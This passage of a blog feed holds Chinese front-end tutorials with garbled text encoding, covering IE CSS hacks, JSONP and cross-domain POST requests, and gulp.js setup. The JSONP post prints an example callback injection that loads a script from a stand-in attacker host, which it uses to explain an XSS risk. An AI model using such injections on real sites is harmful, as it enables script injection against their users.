‡è¯†ç¬¦ */</span></div><div class="line">    <span class="attribute">background</span>: red;    <span class="comment">/* IE6 å’Œä»¥ä¸‹ç‰ˆæœ¬ IE è¯†åˆ« */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="import"><a href="#import" class="headerlink" title="@import"></a>@import</h4><p>IE7 åŠä»¥ä¸‹ç‰ˆæœ¬ä¸æ”¯æŒ <code>@import</code>ï¼Œ<a href="http://www.webdevout.net/css-hacks" target="_blank" rel="external">CSS Hacks</a> çš„è§£å†³åšæ³•æ˜¯ç»™é IE7 åŠä»¥ä¸‹ç‰ˆæœ¬æ·»åŠ ä¸€ä¸ª css <code>@import &quot;non-ie.css&quot; all;</code>ï¼Œæ€ä¹ˆçœ‹éƒ½å¤ªå¥‡è‘©äº†ã€‚</p><h4 id="property-value-å’Œ-property-value"><a href="#property-value-å’Œ-property-value" class="headerlink" title="_property: value å’Œ -property: value"></a>_property: value å’Œ -property: value</h4><p>åªæœ‰ IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ IE æ”¯æŒè¿™ç§ hackï¼Œå¹¶ä¸”è¿™ç§ CSS å†™æ³•æ˜¯éæ³•çš„ï¼Œå½“ç„¶å¦‚æœæƒ³åªç”¨ä¸ IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ IE å°±å¯ä»¥è¿™æ ·å†™ã€‚ å…¶å® IE6 åŠä»¥ä¸‹ç‰ˆæœ¬ IE ä¸ä¼šå¯¹ CSS å±æ€§å‰ç¼€ä¸ºéå­—æ¯çš„å±æ€§æŠ¥é”™æ‰æœ‰è¿™ç§ hackã€‚</p><h4 id="property-value"><a href="#property-value" class="headerlink" title="*property: value"></a>*property: value</h4><p>IE7 ä¿®å¤äº† CSS å±æ€§ä¸º <code>-</code> å’Œ <code>_</code> åŒæ ·è¯†åˆ«çš„é—®é¢˜ï¼Œå½“å…¶ä»–éå­—æ¯å‰ç¼€åº”ç”¨è¿˜æ˜¯å¯ä»¥ï¼Œæ¯”å¦‚ <code>*</code>ï¼Œæ‰€ä»¥è¿™ç§ hack å¯ä»¥ç”¨äº IE7 åŠå…¶ä»¥ä¸‹ç‰ˆæœ¬ã€‚</p><h4 id="gt-body"><a href="#gt-body" class="headerlink" title="&gt;body"></a>&gt;body</h4><p><code>&gt;body</code> æŒ‰æ ‡å‡†æ˜¯é”™è¯¯çš„ CSS å†™æ³•ï¼Œä½† IE7 ä¼šå°†å…¶è§†ä¸ºåˆæ³•é€‰æ‹©å™¨ç­‰åŒäº <code>*&gt;body</code>ï¼ŒåŒæ ·å¯¹äº <code>*+p</code> ä¹‹ç±» IE7 ä¹Ÿä¼šè§†ä¸º <code>*+p</code>ï¼Œä¸è¿‡å…¶ä»–æµè§ˆå™¨åˆ™ä¼šæ— è§†è¿™ä¸ªé”™è¯¯çš„é€‰æ‹©å™¨ï¼Œå› æ­¤è¿™ç§ hack å¯ä»¥ç”¨äº IE7ã€‚</p><h4 id="html"><a href="#html" class="headerlink" title="html*"></a>html*</h4><p><code>html*</code> æŒ‰æ ‡å‡†æ˜¯é”™è¯¯çš„ CSS å†™æ³•ï¼Œä½† IE7 ä¼šå°†å…¶è§†ä¸ºåˆæ³•ç­‰åŒäº <code>html *</code>ï¼Œè€Œ <code>**</code> åˆ™ä¼šè§†ä¸º <code>* *</code>ï¼Œè¿™ç§ hack å¯ä»¥ç”¨äº IE7 åŠä»¥ä¸‹ç‰ˆæœ¬ã€‚</p><h4 id="ie"><a href="#ie" class="headerlink" title="!ie"></a>!ie</h4><p><code>!ie</code> æŒ‰æ ‡å‡†æ˜¯é”™è¯¯çš„ CSS å†™æ³•ï¼Œä½† IE7 ä¼šå°†å…¶è§†ä¸ºåˆæ³•ï¼Œä¸»è¦æ˜¯å®ƒä¿®å¤ <code>!important</code> é—®é¢˜æ—¶åˆå‡ºç°çš„é—®é¢˜ï¼Œç”šè‡³ä½ åœ¨ <code>!</code> åŠ ä»»ä½•å­—æ¯éƒ½æ˜¯åˆæ³•çš„ï¼Œè¿™ç§ hack å¯ä»¥ç”¨äº IE7 åŠä»¥ä¸‹ç‰ˆæœ¬ã€‚</p><h4 id="important-1"><a href="#important-1" class="headerlink" title="!important!"></a>!important!</h4><p>å¥½å§è¿™ä¸ªåœ¨ IE7 ä¹Ÿæ˜¯åˆæ³•çš„ï¼ŒçœŸæ˜¯ä¸ªå·¨å‘ã€‚</p><h4 id="property-value-9"><a href="#property-value-9" class="headerlink" title="property: value\9"></a>property: value\9</h4><p>ä¸€å¼€å§‹çœ‹åˆ°æˆ‘ä¹Ÿæ˜¯æƒ³â€œè¿™ä»€ä¹ˆé¬¼å†™æ³•â€ï¼Œå®ƒç¡®å®æ˜¯åœ¨ IE6~IE8 èµ·ä½œç”¨çš„ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.selector</span> &#123; <span class="attribute">property</span>: value\<span class="number">9</span>; &#125;</div><div class="line">.selector &#123; property/*\**/: value\9; &#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;æœ¬ç¯‡æ–‡ç« å°±æ˜¯ä¸ºäº†æˆ‘å»å‰ç«¯ç¬”è¯•é¢è¯•è€Œå†™çš„ï¼Œå‚è€ƒ &lt;a href=&quot;http://www.webdevout.net/css-hacks&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CSS hacks&lt;/a&gt; å’Œ &lt;a href=&quot;http://browserhacks.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Browserhacks&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="css hacks" scheme="http://youngdze.co/tags/css-hacks/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript è·¨åŸŸè¯·æ±‚</title>
    <link href="http://youngdze.co/2015/10/14/javascript-csrf/"/>
    <id>http://youngdze.co/2015/10/14/javascript-csrf/</id>
    <published>2015-10-14T13:19:07.000Z</published>
    <updated>2016-12-05T05:36:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ª ECMAScript6 ç‰ˆæœ¬çš„ JSONP æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">let</span> jsonpLoad = <span class="function">(<span class="params">url</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</div><div class="line">    <span class="keyword">const</span> timeout = <span class="number">5000</span>;</div><div class="line"></div><div class="line">    Element.prototype.remove = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.parentNode.removeChild(<span class="keyword">this</span>);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</div><div class="line">    <span class="keyword">const</span> callback = <span class="string">`__callback<span class="subst">$&#123;index++&#125;</span>`</span>;</div><div class="line">    <span class="keyword">const</span> timeoutID = <span class="built_in">window</span>.setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">        reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Request timeout.'</span>));</div><div class="line">    &#125;, timeout);</div><div class="line"></div><div class="line">    <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">    script.type = <span class="string">'text/javascript'</span>;</div><div class="line">    script.async = <span class="literal">true</span>;</div><div class="line">    script.src = <span class="string">`<span class="subst">$&#123;url&#125;</span><span class="subst">$&#123;!~url.indexOf(<span class="string">'?'</span>)? <span class="string">'?'</span>: <span class="string">'&amp;'</span>&#125;</span>callback=<span class="subst">$&#123;callback&#125;</span>`</span>;</div><div class="line">    <span class="built_in">document</span>.querySelector(<span class="string">'head'</span>).appendChild(script);</div><div class="line"></div><div class="line">    <span class="built_in">window</span>[callback] = <span class="function"><span class="params">res</span> =&gt;</span> &#123;</div><div class="line">        script.remove();</div><div class="line">        <span class="built_in">window</span>.clearTimeout(timeoutID);</div><div class="line">        resolve(res);</div><div class="line">    &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure><a id="more"></a><p>jsonp çš„ç¼ºç‚¹æ˜¯å®¹æ˜“å¯¼è‡´ XSS è·¨åŸŸæ”»å‡»ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://example.org/api.php?callback=$.getScript(&apos;//evil.example.org/xss.js&apos;);var dontcare=(</div></pre></td></tr></table></figure><p>ä¼šå˜ä¸ºè¿™æ ·ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$.getScript(<span class="string">'http://evil.example.org/xss.js'</span>);<span class="keyword">var</span> dontcare= (&#123; ... &#125;);</div></pre></td></tr></table></figure><p>æ‰€ä»¥ jsonp åªèƒ½ç”¨åœ¨è‡ªå·±ä¿¡ä»»çš„ç«™ç‚¹ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªè·¨åŸŸçš„ post è¯·æ±‚ï¼Œä½†åªèƒ½ postï¼Œä¸èƒ½è·å¾— post è¿”å›çš„æ•°æ®ï¼ŒåŸç†æ˜¯åˆ›å»ºä¸€ä¸ª iframe è¿›è¡Œ postï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">'use strict'</span>;</div><div class="line"></div><div class="line"><span class="keyword">let</span> crossDomainPost = <span class="function">(<span class="params">url, name, value</span>) =&gt;</span> &#123;</div><div class="line">    Element.prototype.remove = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">        <span class="keyword">this</span>.parentNode.removeChild(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</div><div class="line">    <span class="keyword">let</span> uniqueString = <span class="string">'CHANGE_THIS_TO_SOME_UNIQUE_STRING'</span>;</div><div class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</div><div class="line">    iframe.style.display = <span class="string">'none'</span>;</div><div class="line">    iframe.contentWindow.name = uniqueString;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</div><div class="line">    form.target = uniqueString;</div><div class="line">    form.action = url;</div><div class="line">    form.method = <span class="string">'POST'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">let</span> input = <span class="built_in">document</span>.createElement(<span class="string">'input'</span>);</div><div class="line">    input.type = <span class="string">'hidden'</span>;</div><div class="line">    input.name = name;</div><div class="line">    input.value = value;</div><div class="line">    form.appendChild(input);</div><div class="line"></div><div class="line">    <span class="built_in">document</span>.body.appendChild(form);</div><div class="line">    form.submit();</div><div class="line"></div><div class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</div><div class="line">        iframe.remove();</div><div class="line">        form.remove();</div><div class="line">    &#125;, <span class="number">5000</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>å¦å¤–ä¸€ä¸ªæ˜¯ postMessage è·¨åŸŸè¯·æ±‚ï¼Œè§£é‡Šè¯·çœ‹<a href="http://www.cnblogs.com/dolphinX/p/3464056.html" target="_blank" rel="external">html5 postMessageè§£å†³è·¨åŸŸã€è·¨çª—å£æ¶ˆæ¯ä¼ é€’</a></p><p>å‚è€ƒï¼š</p><ul><li><a href="http://stackoverflow.com/questions/8750469/apparent-jsonp-xss-vulnerability" target="_blank" rel="external">http://stackoverflow.com/questions/8750469/apparent-jsonp-xss-vulnerability</a></li><li><a href="http://stackoverflow.com/questions/298745/how-do-i-send-a-cross-domain-post-request-via-javascript" target="_blank" rel="external">http://stackoverflow.com/questions/298745/how-do-i-send-a-cross-domain-post-request-via-javascript</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»¥ä¸‹æ˜¯ä¸€ä¸ª ECMAScript6 ç‰ˆæœ¬çš„ JSONP æ–¹æ³•ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; jsonpLoad = &lt;span class=&quot;function&quot;&gt;(&lt;span class=&quot;params&quot;&gt;url&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; index = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; timeout = &lt;span class=&quot;number&quot;&gt;5000&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Element.prototype.remove = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.parentNode.removeChild(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Promise&lt;/span&gt;(&lt;span class=&quot;function&quot;&gt;(&lt;span class=&quot;params&quot;&gt;resolve, reject&lt;/span&gt;) =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; callback = &lt;span class=&quot;string&quot;&gt;`__callback&lt;span class=&quot;subst&quot;&gt;$&amp;#123;index++&amp;#125;&lt;/span&gt;`&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; timeoutID = &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.setTimeout(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        reject(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;Error&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Request timeout.&#39;&lt;/span&gt;));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;, timeout);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; script = &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.createElement(&lt;span class=&quot;string&quot;&gt;&#39;script&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    script.type = &lt;span class=&quot;string&quot;&gt;&#39;text/javascript&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    script.async = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    script.src = &lt;span class=&quot;string&quot;&gt;`&lt;span class=&quot;subst&quot;&gt;$&amp;#123;url&amp;#125;&lt;/span&gt;&lt;span class=&quot;subst&quot;&gt;$&amp;#123;!~url.indexOf(&lt;span class=&quot;string&quot;&gt;&#39;?&#39;&lt;/span&gt;)? &lt;span class=&quot;string&quot;&gt;&#39;?&#39;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;&#39;&lt;/span&gt;&amp;#125;&lt;/span&gt;callback=&lt;span class=&quot;subst&quot;&gt;$&amp;#123;callback&amp;#125;&lt;/span&gt;`&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.querySelector(&lt;span class=&quot;string&quot;&gt;&#39;head&#39;&lt;/span&gt;).appendChild(script);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;[callback] = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;params&quot;&gt;res&lt;/span&gt; =&amp;gt;&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        script.remove();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;window&lt;/span&gt;.clearTimeout(timeoutID);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        resolve(res);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="csrf" scheme="http://youngdze.co/tags/csrf/"/>
    
      <category term="jsonp" scheme="http://youngdze.co/tags/jsonp/"/>
    
  </entry>
  
  <entry>
    <title>gulp.js åŸºç¡€</title>
    <link href="http://youngdze.co/2015/09/24/gulpjs-basis/"/>
    <id>http://youngdze.co/2015/09/24/gulpjs-basis/</id>
    <published>2015-09-24T01:40:09.000Z</published>
    <updated>2016-12-05T05:37:19.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æƒ³äº†è§£ <strong>gulpjs</strong> æ˜¯ä»€ä¹ˆå¯ä»¥çœ‹<a href="http://gulpjs.com/" target="_blank" rel="external">å®˜ç½‘</a>ã€‚</p></blockquote><h4 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h4><p>æˆ‘å·²ç»å†™å¥½ä¸€ä¸ªé¡¹ç›®çš„ <code>gulpfile.js</code>ï¼Œå…¶ä¸­ç”¨åˆ°çš„ <strong>gulpjs</strong> æ’ä»¶åŒ…æ‹¬ <code>gulp-less</code>ã€<code>gulp-coffee</code>ã€<code>gulp-util</code>ã€<code>webpack</code>ã€<code>gulp-uglify</code>ã€<code>gulp-rename</code>ã€‚</p><a id="more"></a><p>é¦–å…ˆå†™å¥½ <code>package.json</code>ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="attr">"name"</span>: <span class="string">"gulp-example"</span>,</div><div class="line">    <span class="attr">"author"</span>: <span class="string">"youngdze"</span>,</div><div class="line">    <span class="attr">"devDependencies"</span>: &#123;</div><div class="line">    <span class="attr">"coffee-script"</span>: <span class="string">"^1.10.0"</span>,</div><div class="line">    <span class="attr">"gulp"</span>: <span class="string">"^3.9.0"</span>,</div><div class="line">    <span class="attr">"gulp-coffee"</span>: <span class="string">"^2.3.1"</span>,</div><div class="line">    <span class="attr">"gulp-jshint"</span>: <span class="string">"^1.11.2"</span>,</div><div class="line">    <span class="attr">"gulp-less"</span>: <span class="string">"^3.0.3"</span>,</div><div class="line">    <span class="attr">"gulp-rename"</span>: <span class="string">"^1.2.2"</span>,</div><div class="line">    <span class="attr">"gulp-uglify"</span>: <span class="string">"^1.4.0"</span>,</div><div class="line">    <span class="attr">"gulp-util"</span>: <span class="string">"^3.0.6"</span>,</div><div class="line">    <span class="attr">"gulp-watch"</span>: <span class="string">"^4.3.5"</span>,</div><div class="line">    <span class="attr">"webpack"</span>: <span class="string">"^1.12.1"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="attr">"scripts"</span>: &#123;</div><div class="line">    <span class="attr">"prestart"</span>: <span class="string">"gulp"</span>,</div><div class="line">    <span class="attr">"start"</span>: <span class="string">"node --harmony server.js"</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>npm install</code> å…ˆå®‰è£…ã€‚</p><p>å®‰è£…å®Œæˆååœ¨ <code>gulpfile.js</code> å¼•å…¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">"use strict"</span>;</div><div class="line"></div><div class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</div><div class="line"><span class="keyword">var</span> less = <span class="built_in">require</span>(<span class="string">'gulp-less'</span>);</div><div class="line"><span class="keyword">var</span> coffee = <span class="built_in">require</span>(<span class="string">'gulp-coffee'</span>);</div><div class="line"><span class="keyword">var</span> gutil = <span class="built_in">require</span>(<span class="string">'gulp-util'</span>);</div><div class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</div><div class="line"><span class="keyword">var</span> webpackConfig = <span class="built_in">require</span>(<span class="string">'./webpack.config.js'</span>);</div><div class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</div><div class="line"><span class="keyword">var</span> rename = <span class="built_in">require</span>(<span class="string">'gulp-rename'</span>);</div></pre></td></tr></table></figure><p>å…¶ä¸­ <code>webpack.config.js</code> éœ€è¦å…·ä½“äº†è§£è¯·å»çœ‹ <strong>webpack</strong> <a href="http://webpack.github.io/docs/configuration.html" target="_blank" rel="external">å®˜ç½‘è§£é‡Š</a>ï¼Œæˆ‘çš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">"use strict"</span>;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">    context:__dirname + <span class="string">"/public"</span>,</div><div class="line">    entry  :[<span class="string">"./src/getFruits.js"</span>, <span class="string">"./src/id3.js"</span>],</div><div class="line">    output :&#123;</div><div class="line">    path    :__dirname + <span class="string">"/public/build"</span>,</div><div class="line">    filename:<span class="string">"./bundle.js"</span></div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><h4 id="gulp-task"><a href="#gulp-task" class="headerlink" title="gulp task"></a>gulp task</h4><p>å…¶å® <em>gulp task</em> çš„å†™æ³•åŸºæœ¬ä¸€æ ·çš„ï¼Œä¸è¿‡åƒ <strong>webpack</strong> çš„ä¸ä¸€æ ·ï¼Œä»¥ä¸‹ä¼šè¯´æ˜ã€‚</p><h5 id="gulp-less"><a href="#gulp-less" class="headerlink" title="gulp-less"></a>gulp-less</h5><p><code>gulp.src</code> è¯»å–å¼€å‘ç›®å½•ï¼Œ<code>pipe</code> æŒ‡æ˜ä»»åŠ¡ï¼Œ<code>gulp.dest</code> æŒ‡æ˜ä¿å­˜ç›®å½•ã€‚</p><p>åƒè¿™äº›æ’ä»¶è¯¦ç»†çš„é…ç½®å¯ä»¥å»å®ƒä»¬å®˜æ–¹æ–‡æ¡£æŸ¥çœ‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'less'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/src/*.less'</span>)</div><div class="line">    .pipe(less(&#123;</div><div class="line">        globalVars:&#123;</div><div class="line">        ENV: <span class="string">'dev'</span>,</div><div class="line">        version: <span class="number">10</span></div><div class="line">        &#125;</div><div class="line">    &#125;))</div><div class="line">    .pipe(gulp.dest(<span class="string">'public/build'</span>));</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="gulp-coffee"><a href="#gulp-coffee" class="headerlink" title="gulp-coffee"></a>gulp-coffee</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">gulp.task(<span class="string">'coffee'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> gulp.src(<span class="string">'public/src/*.coffee'</span>)</div><div class="line">    .pipe(coffee(&#123;<span class="attr">bare</span>: <span class="literal">true</span>&#125;))</div><div class="line">    .on(<span class="string">'error'</span>, gutil.log)</div><div class="line">    .pipe(gulp.dest(<span class="string">'public/src'</span>));</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h5><p><strong>webpack</strong> æ²¡æœ‰å¯¹åº”çš„ <strong>gulpjs</strong> æŸ¥çœ‹ï¼Œæ‰€ä»¥è¿™é‡Œç”¨çš„æ˜¯ <strong>webpack</strong> å®˜æ–¹æä¾›çš„å†™æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div 